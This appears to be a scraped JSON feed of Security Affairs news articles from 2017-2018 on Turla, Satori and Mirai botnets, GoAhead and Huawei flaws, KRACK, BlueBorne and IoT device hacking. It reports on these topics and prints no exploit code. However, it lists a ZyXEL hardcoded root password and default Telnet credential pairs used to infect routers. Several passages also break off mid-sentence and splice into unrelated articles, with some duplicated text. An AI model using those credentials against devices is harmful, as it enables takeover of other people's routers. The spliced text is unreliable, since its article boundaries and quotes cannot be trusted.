In June 2016, researchers from Kaspersky reported that the Turla APT had started using rootkit), Epic Turla (Wipbot and Tavdig) and Gloog Turla.\n\nIn the most recent attacks, the group is packaging its macOS backdoor with a real Adobe Flash installer and downloading the malware on victim systems from endpoint systems that use a remote IP belonging to Akamai, the Content Delivery Network that is also used by Adobe for its supply chain. Legitimate Flash installer, in fact, are also distributed through the Akamai network.\n\n\u201cIn recent months, we have observed a strange, new behavior, leading to compromise by one of Turla\u2019s backdoors. Not only is it packaged with the real Flash installer, but it also appears to be downloaded from adobe.com.\u201d reads the report published by ESET.\n\n\u201cFrom the endpoint\u2019s perspective, the remote IP address belongs to Akamai, the official Content Delivery Network (CDN) used by Adobe to distribute their legitimate Flash\ninstaller. \u201c\n\nResearchers noted that Turla installers were exfiltrating information to get.adobe.com URLs since at least July 2016, data were sent back to legitimate URLs at Adobe.com. The download attempts observed by ESET observed were made through HTTP and not via HTTPS, the researchers state with confidence that Adobe was not compromised.\n\nThe social engineering technique adopted by Turla group to trick victims into believing they are downloading a legitimate software from Adobe server is very ingenious.\n\nData collected by the experts revealed that most of the victims belong to the former USSR, targeted entities include embassies and consulates located in East Europe.\n\nAt the time of the report is still unclear how the Turla APT group distributed the backdoor through Adobe.com.\n\nExperts speculate that this is possible by compromising a machine on the victim\u2019s network to perform a local man-in-the-middle attack. In this attack scenario, the threat actors redirect traffic from a target system through the compromised server and modifying it on the fly. Another possibility is to leverage on a compromised local gateway that could allow the attackers to potentially intercept and modify traffic for the whole organization.\n\nOther attacks scenarios see Turla executing a man-in-the-middle attack at the ISP level, or BGP hijacking.\n\n\u201cWe quickly discarded the hypothesis of a rogue DNS server, since the IP address corresponds to the servers used by Adobe to distribute Flash.\u201d continues the report. \u201cThus, these are the hypotheses that remain: \u278a a Man-in-theMiddle\n(MitM) attack from an already-compromised machine in the local network, \u278b a compromised gateway or proxy of the organization, \u278c a MitM attack at the Internet Service Provider (ISP) level or \u278d a Border Gateway Protocol (BGP) hijack to redirect the traffic to Turla-controlled servers a MitM attack at the Internet Service Provider (ISP) level or \u278d a Border Gateway Protocol (BGP) hijack to redirect the traffic to Turla-controlled servers.\u201d\n\n\n\nResearchers believe the most likely scenario sees attackers controlling the router for the traffic hijacking.\n\nSuch kind of attack is any way possible because the files are downloaded via HTTP, for this reason, it is important to avoid installing any update or software that was downloaded through unsecured connections.\n\nAdministrators must also check that Flash Player installers downloaded are properly signed with a valid Adobe certificate.\n\nFurther information, including the IOCs are included in the report published by ESET.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Turla APT group, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/adobe", "topic_name": "Adobe"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/turla-apt", "topic_name": "Turla APT"}]}, {"news_name": "Hackers can remotely control thousands of Sonos and Bose speakers", "news_link": "https://securityaffairs.co/wordpress/67292/hacking/hacking-speakers.html", "title": "Hackers can remotely control thousands of Sonos and Bose speakers\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 1, 2018", "body": "Hackers can trigger the flaws to access the speakers and use them to play spooky sounds or to issue Alexa commands.\n\nOnly specific models of the two companies are actually affected by the issues, including the Sonos One and the Bose SoundTouch.\n\nAttackers scan the Internet for vulnerable devices, once discovered flawed speakers they can use the API to instruct them into playing any audio file hosted at a specific URL.\n\n\u201cThe impacted models allow any device on the same network to access the APIs they use to interface with apps like Spotify or Pandora without any sort of authentication.\u201d reads the post published by Wired. \u201cTapping into that API, the researchers could simply ask the speakers to play an audio file hosted at any URL they chose, and the speakers would obey.\u201d\n\n\n\nThe experts at Trend Micro have found between 2,500 to 5,000 Sonos devices and 400 to 500 Bose devices open to audio hacking.\n\nThe attacks are more scaring in scenarios in which those voice assistant devices control smart home features from door locks, conditioners, and lighting.\n\n\u201cWhereas previous studies focused on seizing control of speakers like the Amazon Echo and Google Home, the results of our case study led to unique findings.

The malicious code was developed to target IoT devices, the Satori version targets port 37215 on Huawei HG532 devices.\n\nThe attacks against Huawei HG532 devices were observed in several countries, including the USA, Italy, Germany, and Egypt.\n\n\n\nExperts observed that attacks attempt to exploit the CVE-2017-17215 zero-day vulnerability in the Huawei home router residing in the fact that the TR-064 technical report standard, which was designed for local network configuration, was exposed to WAN through port 37215 (UPnP \u2013 Universal Plug and Play).\n\nNews of the day is that the code used to target the Huawei routers over the past several weeks is now publicly available.\n\nThe discovery was made by Ankit Anubhav, a researcher at security firm NewSky.\n\nAnubhav first discovered the code on Pastebin.com early this week.\n\n\u201cNewSky Security observed that a known threat actor released working code for Huawei vulnerability CVE-2017\u201317215 free of charge on Pastebin this Christmas. This exploit has already been weaponized in two distinct IoT botnet attacks, namely Satori and Brickerbot.\u201d states a blog post published by Anubhav.\n\nThe exploit code for the CVE- 2017-17215 was used by a hacker identified as \u201cNexus Zeta\u201d to spread the Satori bot (aka Okiku).\n\nThe availability of the code online represents a serious risk, it could become a commodity in the criminal underground, vxers could use it to build their botnet.\n\nSatori isn\u2019t the only botnet leveraging the CVE-2017-17215 exploit code, earlier in December, the author of the Brickerbot botnet that goes online with the moniker \u201cJanitor\u201d released a dump which contained snippets of Brickerbot source code.\n\nNewSky Security analyzing the code discovered the usage of the exploit code CVE-2017\u201317215, this means that the code was available in the underground for a long.\n\n\u201cLet us compare this with a binary of Satori botnet (in the image below). Not only we see the same attack vector i.e. code injection in <NewStatusURL>, but also, we witness the other indicator \u201cecho HUAWEIUPNP\u201c string, implying that both Satori and Brickerbot had copied the exploit source code from the same source.\u201d continues NewSky.\n\n\n\nThis is not the first time that IoT botnets leverage issues related to the SOAP protocol. Earlier this year, security experts observed several Mirai-based botnets using two other SOAP bugs (CVE-2014\u20138361 and TR-64) which are code injections in <NewInternalClient> and <NewNTPServer> respectively.\n\nBack to the present, Huawei provided a list of mitigation actions for this last wave of attacks that includes configuring a router\u2019s built-in firewall, changing the default password or using a firewall at the carrier side.\n\nI avoided to provide the link to the code published on Pastebin, but it is very easy to find it with the proper query.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Satori Botnet, CVE-2017-17215)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cve-2017-17215", "topic_name": "CVE-2017-17215"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mirai", "topic_name": "Mirai"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/satori", "topic_name": "satori"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/satori-botnet", "topic_name": "satori botnet"}]}, {"news_name": "Experts discovered a flaw in GoAhead that affects hundreds of thousands IoT devices", "news_link": "https://securityaffairs.co/wordpress/67113/iot/goahead-flaws.html", "title": "Experts discovered a flaw in GoAhead that affects hundreds of thousands IoT devices\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 25, 2017", "body": "A vulnerability in the GoAhead tiny web server package, tracked as CVE-2017-17562, affects hundreds of thousands of IoT devices. The GoAhead solution is widely adopted by tech giants, including Comcast, IBM, Boeing, Oracle, D-Link, ZTE, HP, Siemens, and Canon. It is easy to find the tiny web server in almost any IoT device, including printers and routers.\n\nThe vulnerability was discovered by experts from the security firm Elttam who devised a method to remotely execute malicious code on devices running the GoAhead web server package. The flaw affects all GoAhead versions before GoAhead 3.6.5.\n\n\u201cThis blog post details CVE-2017-17562, a vulnerability which can be exploited to gain reliable remote code execution in all versions of the GoAhead web server < 3.6.5.\u201d reads the analysis published by Elttam. \n\n\u201cThe vulnerability is a result of Initialising the environment of forked CGI scripts using untrusted HTTP request parameters, and will affect all user\u2019s who have CGI support enabled with dynamically linked executables (CGI scripts). This behavior, when combined with the glibc dynamic linker, can be abused for remote code execution using special variables such as LD_PRELOAD (commonly used to perform function hooking, see preeny).\u201d\n\nAttackers can exploit the vulnerability if the CGI support is enabled with dynamically linked CGI program.

This service is supposedly carrying out a firmware upgrade action by sending a request to \u201c/ctrlt/DeviceUpgrade_1\u201d (referred to as controlURL ) and is carried out with two elements  named `NewStatusURL` and `NewDownloadURL`.\u201d continues the analysis.\n\n\u201cThe vulnerability allows remote administrators to execute arbitrary commands by injecting shell meta-characters \u201c$()\u201d in the NewStatusURL and NewDownloadURL\u201d\n\n\n\nThe successful exploitation of the vulnerability could allow an attacker to download and execute the Satori bot.\n\nThe flaw was reported to Huawei on November 27, after a few days, the company published a security advisory that notifies the vulnerability to the users and provides recommendations to prevent the exploitation of the flaw.\n\nCustomers can take the following measures to circumvent or prevent the exploit of this vulnerability. For details, consult the local service provider or Huawei TAC.\n\n\u201cThe customers can deploy Huawei NGFWs (Next Generation Firewall) or data center firewalls, and upgrade the IPS signature database to the latest version IPS_H20011000_2017120100 released on December 1, 2017 to detect and defend against this vulnerability exploits initiated from the Internet.\u201d reads the andisory published by Huawei.\n\nEach Satori bot floods targets with manually crafted UDP or TCP packets, they first attempt to resolve the IP address of a C&C server using DNS request with the hardcoded domain name, then gets the addresses from the DNS response and tries to connect via TCP on the hardcoded target port (7645).\n\nThe C&C server, in turn, provides the number of packets used for the flooding action and their corresponding parameters, and can also pass an individual IP for attack or a subnet.\n\nThe bot uses a custom protocol to communicate with the C&C, it includes two hardcoded requests to check in with the server that responds with the DDoS attack parameters.\n\nThe researchers that investigated the case determined that the actor behind the Satori botnet might be using the online handle of NexusZeta.\n\nNexusZeta is very active on social media such as Twitter and Github, and has Skype and SoundCloud accounts under the name of Caleb Wilson (caleb.wilson37 / Caleb Wilson 37).\n\nWhile the actor described himself as a novice (\u201can amateur with lots of motivation, looking for the crowd\u2019s wisdom.\u201d), it is unclear how he discovered the zero-day vulnerability .\n\n\u201cNonetheless, as seen in this case as well as others over the past year, it is clear that a combination of leaked malware code together with exploitable and poor IoT security, when used by unskilled hackers, can lead to disastrous results,\u201d Check Point concludes.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Sartori botnet, Mirai)\n\n", "topics": [{"topic_link":

the Linux.ProxyM malware that is currently being used in a campaign attempting to hack websites.\n\nExperts first analyzed the Linux.ProxyM in July, it was used to create a proxy network through SOCKS proxy server on infected devices that are used to relay malicious traffic, disguising his real source.\n\nThe Trojan has been noted since February 2017 but peaked in late May.\n\nAccording to Dr. Web, the number of devices infected with Linux.ProxyM reached 10,000 units in July since its discovery in February 2017.\n\nThe malware is able to target devices based on different architectures including x86, MIPS, MIPSEL, PowerPC, ARM, Superh, Motorola 68000, and SPARC.\n\n\u201cLinux.ProxyM is a malicious program for Linux which launches a SOCKS proxy server on an infected device. Cybercriminals can use it to anonymously perform destructive actions.\u201d wrote Dr Web.\n\n\u201cThe known assembly of this Trojan exists for devices possessing the following architectures: x86, MIPS, MIPSEL, PowerPC, ARM, Superh, Motorola 68000, and SPARC. It means Linux.ProxyM can infect almost any Linux device, including routers, set-top boxes, and other similar equipment.\u201d\n\nThe campaign observed in September was abusing the botnet to send out spam emails, experts estimated that with each infected device generated around 400 messages per day in September.\n\nLater attacks used the botnet to send out phishing emails, the messages supposedly came from DocuSign, a company that provides electronic signature technology and digital transaction management services for facilitating electronic exchanges of contracts and signed documents.\n\nThe phishing messages included a link to a fake DocuSign website that featured an authorization form, the attackers used this schema to trick victims into entering their credentials. Then the victims were being redirected to the real DocuSign authorization page.\n\n\n\nIn December, crooks started using the Linux.ProxyM\u2019s proxy server to hack websites through various methods, including SQL injections, XSS (Cross-Site Scripting), and Local File Inclusion (LFI).\n\n\u201c[the hacking methods] are SQL injections (an injection of a malicious SQL code into a request to a website database), XSS (Cross-Site Scripting)\u2014an attack method that involves adding a malicious script to a webpage, which is then executed on a computer when this page is opened, and Local File Inclusion (LFI).\u201d continues the analysis.\n\n\u201cThis kind of attack allows attackers to remotely read files on an attacked server using specially crafted commands. Among the attacked websites were game severs, forums and resources on other topics, including Russian websites.\u201d\n\nOn Dec. 7, researchers at Dr. Web observed 20,000 attacks launched by the Linux.ProxyM botnet. About a month ago, the bots were launching nearly 40,000 attacks per day.\n\n\n\n\u201cAlthough Linux.ProxyM has only one function\u2014a proxy server\u2014cybercriminals continue finding new opportunities to use it for illegal actions and showing increasing interest in the \u2018Internet of things\u2019,\u201d concludes Doctor Web.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Linux Malware, Linux.ProxyM)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/linux-malware", "topic_name": "Linux malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/linux-proxym", "topic_name": "Linux.ProxyM"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mining", "topic_name": "mining"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spam", "topic_name": "spam"}]}, {"news_name": "US indicts Chinese hackers belonging to APT3 for espionage on Siemens and Moody\u2019s", "news_link": "https://securityaffairs.co/wordpress/66087/apt/us-indicts-chinese-apt3-hackers.html", "title": "US indicts Chinese hackers belonging to APT3 for espionage on Siemens and Moody\u2019s\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 28, 2017", "body": "US authorities charged three China-based hackers for stealing sensitive information from US based companies, including Siemens AG, and accessing a high-profile email account at Moody\u2019s.\n\nThe three Chinese citizens, Wu Yingzhuo, Dong Hao and Xia Lei, work for the Chinese cybersecurity company Guangzhou Bo Yu Information Technology Company Limited, also known as \u201cBoyusec.\u201d\n\nWhile Wu and Dong are founding members and shareholders of the China-based company, Xia is just an employee.\n\nDo you remember the Boyusec name?\n\nSeveral reports published in May 2017 linked the Boyusec firm to the infamous APT3 group, a cyber-espionage group under the control of the Chinese Government.\n\nThe APT3, also known as UPS, Gothic Panda, and TG-011, has been active since 2010.\n\n\n\nOn May 9th, 2017, an unknown party using the alias \u2018intrusiontruth\u2019 published a series of blogs posts describing connections between the Pirpi RAT command and control components and shareholders of the Chinese security contractor Guangzhou Boyu Information Technology Company, aka Boyusec.\n\nThe names of two specific shareholders of Boyusec appear in the domain registration for the Pirpi C&C servers.  This is particularly interesting because Boyusec supports the Chinese Ministry of State Security (MSS) by collecting civilian human intelligence. Think of them as an outsourcer for a government agency like the United States\u2019 National Security Agency (NSA).\n\nAlso interesting is that in 2016 a Pentagon report described the relationship between Boyusec and network equipment manufacturer, Huawei. According to the report, the two companies were colluding to develop security equipment with embedded backdoors which would likely be used by Boyusec to compromise Huawei customers.\n\n\u201cIn November 2016, the Washington Free Beacon reported that a Pentagon internal intelligence report had exposed a product that Boyusec and Huawei were jointly producing.\u201d continues the analysis.\u201dAccording to the Pentagon\u2019s report, the two companies were working together to produce security products, likely containing a backdoor, that would allow Chinese intelligence \u201cto capture data and control computer and telecommunications equipment.\u201d The article quotes government officials and analysts stating that Boyusec and the MSS are \u201cclosely connected,\u201d and that Boyusec appears to be a cover company for the MSS.\u201d\n\nThe Chinese men have been charged in Pittsburgh with using malware to steal data from the international corporations, including Siemens AG, which has Pittsburgh offices.\n\nThe federal indictment filed in September was unsealed Monday, the men were charged by a grand jury for cyber-attacks against three corporations in the financial, engineering and technology industries between 2011 and May 2017.

After investigation, we are quite confident to tell this is a new mirai variant.\u201d reads the analysis published by Fengpei.\n\nThe PoC triggers the flaw CVE-2016-10401 in old ZyXEL PK5001Z routers that was publicly disclosed in January 2016. ZyXEL PK5001Z routers have a hardcoded super-user password (zyad5001) that could be used to elevate a user\u2019s access to root level. The su password cannot be used to log into the device.\n\nAnyway, attackers have discovered that there\u2019s a large amount of ZyXEL devices are using admin/CentryL1nk and admin/QwestM0dem as default Telnet credentials.\n\nThe PoC code recently published first logs into a remote ZyXEL device using one of the two Telnet passwords, and then uses the hardcoded su password to gain root privileges.\n\nStarting on Wednesday, Netlab has detected a spike of scans on ports 23 and 2323 for  Telnet authentication the evidence that attackers are using the above PoC to infect exposed device with Mirai.\n\n\u201cThe abuse of these two credentials began at around 2017-11-22 11:00, and reached its peak during 2017-11-23 daytime.

But if your business relies on the Internet to sell products or collaborate, a DoS attack is more than a nuisance, it can be critical.\n\nOver the past few years, the number of DoS attacks has continued to slowly grow in a \u201ccat and mouse\u201d evolution \u2014 bad actors get a slightly stronger attack, and network vendors come up with slightly more resilient equipment to defend. Generally the attacks came from botnets comprised of infected computers and servers. The cost of acquiring and keeping these systems in the botnet was relatively expensive, so there was an economic limiter on how fast the attacks would grow. Then Mirai happened in 2016 and everything changed.\n\nThe Mirai botnet didn\u2019t struggle with corporate security teams and technical security controls like anti virus software and firewalls.\n\n\n\nInstead, it focused on the millions of Internet of Things (IoT) devices like webcams and Internet routers in the home to build the botnet. With no security controls to overcome, the Mirai botnet was able to grow and launch Distributed Denial of Service (DDoS) attacks larger than ever seen before. A high-profile attack against Internet journalist Brian Krebs signaled that things had changed, then the October 2016 attack against DNS provider Dyn, showed how devastating a DDoS attack can be. And in the world of a cyber criminal, devastating is where the profit opportunities lie.\n\nAccording to an Arbor Networks\u2019 report at the end of 2016, \u201cIn 2016, IoT botnets emerged as a source of incredibly high volume DDoS attacks. So far these massive attacks have not leveraged reflection/amplification techniques. They are simply taking advantage of the sheer number of unsecured IoT devices that are deployed today.\u201d (PDF) The report goes on to highlight that the number of DDoS attacks was up significantly over 2015 and the average size and time of the attack has also increased. \u201cThe longest DDoS attack in Q4 2016 lasted for 292 hours (or 12.2 days) \u2013 significantly longer than the previous quarter\u2019s maximum (184 hours, or 7.7 days) and set a record for 2016,\u201d according to Kaspersky\u2019s DDoS Intelligence Report for Q4 2016. Knowing that cyber crime is fueled by profit motives now, it is safe to assume that the cyber criminals have figured out how to monetize the IoT threat and we can expect this growing trend in attacks to continue.\n\nWe have confirmation of this trend from DDos prevention provider, Corero. According to their most recent analysis, \u201cOrganizations are now experiencing an average of 8 DDoS attack attempts per day, up from 4 per day at the beginning of 2017, fueled by unsecured IoT devices and DDoS-for-hire services.\u201d Massive DDoS attacks are getting all of the press attention, but they are only part of the story. What is most interesting about the analysis, however, is the discovery that, \u201cA fifth of the DDoS attack attempts recorded during Q2 2017 used multiple attack vectors. These attacks utilize several techniques in the hope that one, or the combination of a few, can penetrate the target network\u2019s security defenses.\u201d In other words, the criminals\u2019 objective often isn\u2019t the denial of service, but using overwhelming noise at the perimeter to hide malware injection and data exfiltration activities.\n\nDDoS has joined other cyber crimes as a well established, profitable exploitation technology. For as little as $20 per hour, anyone can take advantage of DDoS-as-a-Services and launch an attack at their target of choice. The opportunity to profit from Ransom Denial of Service, where companies pay to avoid being DDoS\u2019d, to using DDoS as a mask for other profitable cyber crime activities means we haven\u2019t seen the end of the growing trend in Denial of Service attacks.\n\n \n\nPierluigi Paganini\n\n(Security Affairs \u2013 DDoS Attack, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos-attack", "topic_name": "DDoS attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mirai", "topic_name": "Mirai"}]}, {"news_name": "20 Million Google Home\u00a0and\u00a0Amazon Echo devices are affected by the Blueborne flaws", "news_link": "https://securityaffairs.co/wordpress/65627/hacking/blueborne-google-home-amazon-echo.html", "title": "20 Million Google Home\u00a0and\u00a0Amazon Echo devices are affected by the Blueborne flaws\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 17, 2017", "body": "Once an attacker compromises a Bluetooth-enabled device, he can infect any other device on the same network.\n\nThe IoT security firm Armis now reported that an estimated 15 million Amazon Echo and 5 million Google Home devices are vulnerable to BlueBorne attack.\n\n\u201cFollowing the disclosure of the BlueBorne attack vector this past September, Armis discovered that critical Bluetooth vulnerabilities impact the Amazon Echo and Google Home.

Unfortunately, we found this is not guaranteed by the WPA2 protocol. By manipulating cryptographic handshakes, we can abuse this weakness in practice.\u201d\n\n\n\nThe attacker just needs to trick a victim into re-installing an already-in-use key, which is achieved by manipulating and replaying cryptographic handshake messages.\n\nKRACK Detector is a script written in Python Language that can detect possible KRACK attacks against client devices on your network. It uses Python 2 for backward compatibility with older operating systems.\n\n\u201cKRACK Detector is a Python script to detect possible KRACK attacks against client devices on your network. The script is meant to be run on the Access Point rather than the client devices. It listens on the Wi-Fi interface and waits for duplicate message 3 of the 4-way handshake. It then disconnects the suspected device, preventing it from sending any further sensitive data to the Access Point.\u201d states the description of the tool.\n\nNetwork administrators have to run the script on the Access Point rather than the client devices, it listens on the Wi-Fi interface and waits for duplicate message 3 of the 4-way handshake. Once it detects a device sending the handshake message it then disconnects it in order to prevent it from sending any further sensitive data to the Access Point.\n\nThe presence of message 3 of the 4-way handshake is a necessary condition for the Krack attack, however, it might be retransmitted even if no attack is ongoing.\n\n\u201cIn such a case the client device will be disconnected from the Wi-Fi network. Some client devices will take some time to re-authenticate themselves, losing the Wi-Fi connection for a few seconds.\u201d reported the Kitploit.com.\n\nNo external Python packages are required, network administrators have to run the script as root and pass the Wi-Fi interface as a single argument.\n\nAdministrators need to use the actual Wi-Fi interface and not any bridge interface it connects to.\n\nThe tool also allows avoiding suspending suspected devices by using the \u201c-n\u201d flag\n\nThe tool is available on Github at the following link:\n\nPierluigi Paganini\n\n(Security Affairs \u2013 KRACK attack, KRACK Detector )\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/krack-attack", "topic_name": "KRACK attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/krack-detector", "topic_name": "KRACK Detector"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/wi-fi", "topic_name": "Wi-Fi"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/wpa2", "topic_name": "WPA2"}]}, {"news_name": "A new Mirai-Like IoT Botnet is growing in a new mysterious campaign", "news_link": "https://securityaffairs.co/wordpress/64565/malware/new-iot-botnet-growing.html", "title": "A new Mirai-Like IoT Botnet is growing in a new mysterious campaign\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 20, 2017", "body": "The new thing bot emerged at the end of September and appears much more sophisticated, according to the experts the malware already infected more than one million organizations worldwide.\n\nThe malicious code tries to exploit many known-vulnerabilities in various IP camera models, including GoAhead, D-Link, TP-Link, AVTECH, NETGEAR, MikroTik, Linksys, and Synology.\n\nThe experts speculate that the malware once compromised a device use it to spread itself.\n\n\u201cWith each passing day the malware was evolving to exploit an increasing number of vulnerabilities in Wireless IP Camera devices such as GoAhead, D-Link, TP-Link, AVTECH, NETGEAR, MikroTik, Linksys, Synology and others.

The vast number of devices makes it very expensive to connect everything with traditional network cabling and in many cases the equipment only supports wireless connectivity.\n\nMany IoT devices for consumers leverage WiFi networks and we are already seeing the security challenges with these technologies. The largest Denial of Service (DoS) attacks leverage consumer IoT equipment (Mirai Botnet) and there are many stories of bad actors spying on people through their unsecured webcams.\n\nWhile WiFi is widely adopted in homes, it doesn\u2019t scale well to large commercial installations like Industrial IoT in manufacturing, energy or SmartCities.\n\nAs communications carriers deploy expansive 4G/5G Wireless Networks these are becoming the infrastructure of choice for commercial IoT. Unfortunately, although managed by professionals, they still have many vulnerabilities that can increase risks unexpectedly. We already knew that the SMS messaging system was flawed and can not be relied upon for secure messaging.\n\nNow security vendor, Positive Technologies, is warning that a fundamental protocol of 4G/5G Wireless Networks creates three potential risks.\n\n\u201cDetected vulnerabilities pose a threat to intelligent traffic lights and street lighting; electronic road signs; information displays at bus stops; and other smart city features that are commonly connected to mobile networks of the fourth generation. Positive Technologies revealed these flaws in mobile networks, which are also relevant to future 5G networks, as part of security assessment conducted in 2016 and 2017.\u201d reads the report published by Positive Technologies.\n\n\u201cVulnerability exploitation techniques specified in the report are based on flaws of the GTP protocol. They do not require an attacker to possess any sophisticated tools or skills, instead they simply need a laptop, a free software installer for penetration tests, and basic programming skills.\u201d\n\nYou have probably heard about Voice Over IP (VoIP) which is a technology method to convert voice into discrete data packets. Once converted it becomes possible to send voice conversations through the same network as computer-to-computer data transmissions (e.g. email, streaming videos, etc.)\n\nThese networks rely on something called the Extended Packet Core (EPC) which in turn leverages General Tunneling Protocol (GTPv2) to allow voice and data communications channels to be combined. It is within the GTPv2 proposal that the most recent flaws were discovered.\n\n\n\nOn its own, there is no encryption included in the protocol so inherent security and authentication must be handled elsewhere in the applications.\n\n\u201cThe mobile network infrastructure is based on a set of telephony signaling protocols, developed in 1975, when security wasn\u2019t a consideration but was less of a risk as only a few people had access. Today that\u2019s no longer true. Access has spiralled yet security is still non-existent,\u201d explains Michael Downs, Director of Telecoms Security (EMEA) of Positive Technologies.\n\nPositive Technologies predicts three different, potential exploits:\n\nSimilar to other wireless protocols like WiFi and Bluetooth, EPC is not inherently secure. If you need to rely on these topologies for secure communications, you need to take advantage of additional security controls. As always, you must be accountable for your own security.\n\n \n\n \n\nPierluigi Paganini\n\n(Security Affairs \u2013 4G/5G Wireless Networks, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/general-tunneling-protocol", "topic_name": "General Tunneling Protocol"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gtpv2", "topic_name": "GTPv2"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/smar-cities", "topic_name": "smar cities"}]}, {"news_name": "Security researcher found roughly 700 Brother printers left exposed online", "news_link": "https://securityaffairs.co/wordpress/63987/iot/brother-printers-left-exposed.html", "title": "Security researcher found roughly 700 Brother printers left exposed online\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 8, 2017", "body": "The security researcher Ankit Anubhav, principal researcher at NewSky Security, has discovered nearly 700 Brother printers left exposed online.

Internet of Sex Toys\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 1, 2017", "body": "The recent discovery that internet connected sex toys have major security and privacy flaws should come as no shock but this does raise the issue of how to both satisfy the consumer\u2019s needs while providing maximum protection.  The most recent flaw was discovered in the Lovense Hush sex toy \u2013 an IoT-enabled butt plug \u2013 by Pen Test Partners.\n\nThe flaw involves Bluetooth Low Energy (BLE) technology and the poor security design of sex toys themselves.  According to Pen Test, the Hush could be located even on a city-wide basis and can be easily hacked if not connected to a cell phone.\n\nFirst, the device makes itself known on Bluetooth under the Hush BLE name, LVS-Z001.  Simple scans using an ordinary cell phone or Blue tooth enabled notepad can identify such devices at a fairly good distance.  The simple naming feature will clearly show that someone has the sex toy nearby even if it is connected or \u201cpaired\u201d with a Bluetooth control device such as a personal cell phone.  While this does present privacy issues with in-home use \u2013 the device may also be found on users in public.\n\n\u201cRecently I was in Berlin, walking with a Bluetooth discovery app, this one is Lightblue,\u201d noted the PTP researcher.  \u201cI was genuinely surprised to see the Hush BLE name, LVS-Z001, pop up.\u201d\n\n\u201cBINGO! This is genuinely the discovery of a Hush plug, ready and waiting for anyone to connect to it, on a public street.\u201d\n\nBLE technology also enables these toys to be located using radio triangulation techniques.  It is possible with multiple trackers to identify the specific individual who may be carrying one.  There are other methods such as gateway scanners placed in storefronts will trigger a hit on the device as one passes through the entrance.\n\nThis raises the likelihood that large organizations can use a combination of camera facial recognition and scanning to identify the specific individual equipped with a sex toy or if the gateway scanner is placed at a check-out/purchase register \u2013 commercial stores could identify the specific user and obtain account information along with marketing data from the device itself.\n\nThe PTP researchers used Bluefruit hardware to see the BLE command packets sent by the sextoy using Wireshark software.  The PTP researchers noted this low cost hacking enabled them to see control command codes sent to the Hush device.  The commands themselves can be reproduced and replayed using a simple BLE dongle available for about \u00a35 ($7 US dollars).  A hacker could send short hex character strings to command the Hush to turn on, vibrate at various levels or turn off.\n\nThe BLE connection did not require any pin entry so there was no security present to command the Hush device.  This security problem with Bluetooth is not uncommon with most devices.  In fact, most Bluetooth devices either have no pin or a fixed pin value of 0000 or 1234.  This poor security issue is shared by a wide variety of IOT sex toys tested by PTP including the Kiiroo Fleshlight, Lelo and Lovense Nora and Max.\n\n\u201cLoading a configuration at the factory could allow for a unique PIN to be created for each adult toy. This is an expensive option, as devices will have to be powered up and flashed. A PIN sticker per device will also add cost.\u201d continues PTP researchers.\n\nThere are problems inherent with Bluetooth itself that lends toward security and privacy breaches.  Current Bluetooth devices will resort to an open status once the battery runs out or when they become disconnected from the controlling cell phone.  Once this occurs, a hacker can establish complete control.  Current Bluetooth 4.0 technology also specifies that only one cell phone can control your Bluetooth device.  This protocol makes it hard to either reset the authorization or jam the connection.  However, Bluetooth 4.2 is very different.  The 4.2 protocol allows multiple cell phones to control a single device, complicating the situation and making it far easier for a hacker to gain illicit access.\n\nThese sex toys are bound to become more sophisticated in the near future; storing additional usage 